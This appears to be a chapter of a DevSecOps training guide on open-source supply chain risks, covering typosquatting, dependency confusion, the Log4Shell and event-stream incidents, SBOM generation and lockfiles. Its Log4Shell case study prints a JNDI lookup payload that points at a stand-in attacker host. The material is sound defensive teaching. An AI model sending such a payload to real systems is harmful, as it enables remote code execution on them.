# Chapter 5.1: Third-Party & Open Source Risks

## Overview

Modern applications are 70-90% open source dependencies. A single vulnerable library can compromise the entire application. This chapter covers the risks of third-party code, supply chain attacks, and strategies for managing dependency risk.

---

## The Dependency Problem

```
MODERN APPLICATION COMPOSITION:

  ┌──────────────────────────────────────────────────────────┐
  │                YOUR APPLICATION (100%)                    │
  │                                                            │
  │  ┌────────────────────────────────────────────────────┐  │
  │  │█████████████████████████████████████████████████████│  │
  │  │████████████ OPEN SOURCE DEPENDENCIES ██████████████│  │
  │  │██████████████████ (70-90%) ████████████████████████│  │
  │  │█████████████████████████████████████████████████████│  │
  │  └────────────────────────────────────────────────────┘  │
  │  ┌──────────────┐                                        │
  │  │░░░YOUR CODE░░│ (10-30%)                               │
  │  └──────────────┘                                        │
  │                                                            │
  │  Example: Express.js app with 50 direct dependencies      │
  │           → 1,500+ transitive dependencies                │
  └──────────────────────────────────────────────────────────┘
```

---

## Software Supply Chain

```
SOFTWARE SUPPLY CHAIN ATTACK SURFACE:

  Developer    Package       Build        Deploy       Runtime
  ──────────  ─────────   ──────────   ──────────   ──────────
      │            │            │            │            │
      ▼            ▼            ▼            ▼            ▼
  ┌────────┐  ┌────────┐  ┌────────┐  ┌────────┐  ┌────────┐
  │Typo-   │  │Compro- │  │Build   │  │Tampered│  │Runtime │
  │squatting│  │mised   │  │system  │  │artifact│  │exploit │
  │         │  │package │  │attack  │  │        │  │of vuln │
  │lodash   │  │event-  │  │Solar-  │  │Compro- │  │Log4j   │
  │vs lodas │  │stream  │  │Winds   │  │mised   │  │Log4Shell│
  │         │  │breach  │  │        │  │registry│  │        │
  └────────┘  └────────┘  └────────┘  └────────┘  └────────┘
     2019        2018        2020        2021        2021
```

---

## Types of Supply Chain Risks

```
RISK CATEGORIES:

  1. KNOWN VULNERABILITIES (CVEs)
  ┌──────────────────────────────────────────────────────┐
  │ Published vulnerabilities in dependencies             │
  │ Example: Log4Shell (CVE-2021-44228) in log4j 2.x    │
  │ Impact: Remote code execution                         │
  │ Detection: SCA scanning, vulnerability databases     │
  └──────────────────────────────────────────────────────┘

  2. MALICIOUS PACKAGES
  ┌──────────────────────────────────────────────────────┐
  │ Intentionally harmful code in packages                │
  │ Types:                                                │
  │   - Typosquatting: crossenv (malicious) vs cross-env │
  │   - Account takeover: Package maintainer compromised │
  │   - Dependency confusion: Internal name on public npm│
  └──────────────────────────────────────────────────────┘

  3. LICENSE COMPLIANCE
  ┌──────────────────────────────────────────────────────┐
  │ Using code with incompatible licenses                 │
  │ GPL in commercial product = legal risk                │
  │ AGPL in SaaS = must open-source your code            │
  └──────────────────────────────────────────────────────┘

  4. UNMAINTAINED PACKAGES
  ┌──────────────────────────────────────────────────────┐
  │ No active maintainer = no security patches            │
  │ Last update > 2 years = risk indicator               │
  │ Single maintainer = bus factor risk                   │
  └──────────────────────────────────────────────────────┘

  5. TRANSITIVE DEPENDENCIES
  ┌──────────────────────────────────────────────────────┐
  │ Dependencies of your dependencies                     │
  │ You may not know they exist                           │
  │ They can introduce vulnerabilities silently            │
  │                                                        │
  │ Your app → Package A → Package B → VULNERABLE PKG    │
  └──────────────────────────────────────────────────────┘
```

---

## Real-World Supply Chain Attacks

```
CASE STUDY 1: LOG4SHELL (CVE-2021-44228) - December 2021

  Timeline:
  ┌────────────────────────────────────────────────────────┐
  │ Nov 24: Vulnerability reported to Apache               │
  │ Dec  9: PoC exploit published                          │
  │ Dec 10: Active exploitation in the wild                │
  │ Dec 13: Apache releases patch (2.16.0)                 │
  │ Dec 17: 800,000+ attacks detected                      │
  │                                                          │
  │ Impact: Remote Code Execution in ANY Java app using    │
  │         log4j 2.x (used by ~35% of Java applications) │
  │                                                          │
  │ Attack: ${jndi:ldap://evil.com/exploit}                │
  │         → Sent in any logged field (User-Agent, etc.)  │
  │         → log4j evaluates the JNDI lookup               │
  │         → Downloads and executes attacker's code        │
  │                                                          │
  │ Lesson: SCA tools would have flagged the vulnerable    │
  │         version immediately. Teams WITH SCA patched    │
  │         in hours. Teams WITHOUT took days/weeks.       │
  └────────────────────────────────────────────────────────┘

CASE STUDY 2: EVENT-STREAM (2018)

  ┌────────────────────────────────────────────────────────┐
  │ Attacker gained maintainer access to popular npm pkg   │
  │ Added malicious dependency targeting cryptocurrency    │
  │ wallets (Copay Bitcoin wallet)                         │
  │                                                          │
  │ 8 million weekly downloads affected                     │
  │                                                          │
  │ Lesson: Vet maintainer changes; use lockfiles;          │
  │         monitor dependency changes in PRs               │
  └────────────────────────────────────────────────────────┘
```

---

## SBOM (Software Bill of Materials)

```
SBOM — WHAT'S IN YOUR SOFTWARE:

  ┌──────────────────────────────────────────────────────┐
  │ Software Bill of Materials (SBOM)                     │
  │                                                        │
  │ Like a food ingredient label, but for software:       │
  │                                                        │
  │ ┌────────────────────────────────────────────────┐   │
  │ │ Component         │ Version │ License │ CVEs   │   │
  │ ├───────────────────┼─────────┼─────────┼────────┤   │
  │ │ express           │ 4.18.2  │ MIT     │ 0      │   │
  │ │ lodash            │ 4.17.21 │ MIT     │ 0      │   │
  │ │ jsonwebtoken      │ 9.0.0   │ MIT     │ 0      │   │
  │ │ axios             │ 0.21.1  │ MIT     │ 2      │   │
  │ │ log4j-core        │ 2.14.1  │ Apache  │ 4 (!)  │   │
  │ └────────────────────────────────────────────────┘   │
  │                                                        │
  │ Formats: SPDX (ISO standard), CycloneDX (OWASP)     │
  │ Required by: US Executive Order 14028 (2021)          │
  └──────────────────────────────────────────────────────┘
```

```bash
# Generate SBOM with Syft
syft . -o spdx-json > sbom.spdx.json
syft . -o cyclonedx-json > sbom.cdx.json

# Generate SBOM with CycloneDX
# Node.js
npx @cyclonedx/cyclonedx-npm --output-file sbom.json

# Python
pip install cyclonedx-bom
cyclonedx-py requirements -i requirements.txt -o sbom.json

# Java
mvn org.cyclonedx:cyclonedx-maven-plugin:makeBom
```

---

## Dependency Management Best Practices

```
DEPENDENCY HYGIENE:

  ┌────────────────────────────────────────────────────────┐
  │                                                          │
  │  1. USE LOCKFILES                                        │
  │  ┌────────────────────────────────────────────────────┐  │
  │  │ package-lock.json (npm)                            │  │
  │  │ yarn.lock (Yarn)                                    │  │
  │  │ Pipfile.lock (Python)                               │  │
  │  │ go.sum (Go)                                         │  │
  │  │ → Pins exact versions, prevents supply chain swap  │  │
  │  └────────────────────────────────────────────────────┘  │
  │                                                          │
  │  2. MINIMAL DEPENDENCIES                                 │
  │  ┌────────────────────────────────────────────────────┐  │
  │  │ Ask: "Do I really need a package for this?"        │  │
  │  │ left-pad incident: 11 lines of code broke npm     │  │
  │  │ Prefer standard library where possible              │  │
  │  └────────────────────────────────────────────────────┘  │
  │                                                          │
  │  3. VET NEW DEPENDENCIES                                 │
  │  ┌────────────────────────────────────────────────────┐  │
  │  │ Check: Maintainer reputation, download count,      │  │
  │  │ last update, open issues, security track record    │  │
  │  │ Tools: Socket.dev, Snyk Advisor, npm audit         │  │
  │  └────────────────────────────────────────────────────┘  │
  │                                                          │
  │  4. PIN VERSIONS                                         │
  │  ┌────────────────────────────────────────────────────┐  │
  │  │ Use exact versions: "lodash": "4.17.21"            │  │
  │  │ NOT ranges: "lodash": "^4.0.0"                     │  │
  │  │ Update deliberately via PR, not automatically      │  │
  │  └────────────────────────────────────────────────────┘  │
  └────────────────────────────────────────────────────────┘
```

---

## Troubleshooting Tips

| Problem | Cause | Solution |
|---------|-------|----------|
| Too many transitive vulnerabilities | Deep dependency tree | Focus on direct dependencies first; check if transitive vulns are reachable |
| Vulnerability has no fix available | Maintainer hasn't patched yet | Apply workarounds, WAF rules, or consider alternative package |
| Can't upgrade due to breaking changes | Major version upgrade required | Use compatibility shims; plan migration sprint; use overrides for transitive deps |
| Dependency confusion attack | Internal package name exists on public registry | Use scoped packages (@company/pkg); configure registry priority |
| SBOM generation fails | Unsupported package format | Use Syft (supports 15+ ecosystems); generate from container image |

---

## Summary Table

| Concept | Description |
|---------|-------------|
| **SCA** | Software Composition Analysis — scanning dependencies for vulnerabilities |
| **SBOM** | Software Bill of Materials — inventory of all components |
| **CVE** | Common Vulnerabilities and Exposures — published vulnerability ID |
| **Transitive Dependency** | Dependency of a dependency (indirect) |
| **Typosquatting** | Malicious package with similar name to popular package |
| **Dependency Confusion** | Tricking build to use public package instead of private |
| **Lockfile** | File pinning exact dependency versions |

---

## Quick Revision Questions

1. **Why is third-party code a significant security risk?**
   > Modern applications are 70-90% open source code. A vulnerability in any dependency can compromise the entire application. Additionally, transitive dependencies (dependencies of dependencies) can introduce vulnerabilities the developer isn't even aware of.

2. **What is an SBOM and why is it important?**
   > A Software Bill of Materials is a complete inventory of all software components (name, version, license, known vulnerabilities). It's essential for vulnerability management, incident response (e.g., "are we affected by Log4Shell?"), license compliance, and is required by US Executive Order 14028.

3. **What is a dependency confusion attack?**
   > When an attacker publishes a malicious package on a public registry (npm, PyPI) with the same name as a company's internal/private package. If the build system checks the public registry first, it downloads the attacker's version instead. Mitigate with scoped packages and registry configuration.

4. **What lessons did Log4Shell teach about dependency management?**
   > Organizations with SCA scanning detected and patched the vulnerable log4j versions within hours, while those without took days or weeks. It demonstrated the critical need for: SBOM to know what's deployed, SCA scanning in CI/CD, and rapid patching processes.

5. **What are lockfiles and why are they security-critical?**
   > Lockfiles (package-lock.json, yarn.lock, etc.) pin exact versions of all dependencies including transitive ones. They prevent supply chain attacks where an attacker publishes a compromised version — the lockfile ensures only the tested version is installed.

---

[← Previous: 4.5 DAST Pipeline Integration](../04-DAST/05-dast-pipeline-integration.md) | [Next: 5.2 SCA Tools →](02-sca-tools.md)

[Back to Table of Contents](../README.md)
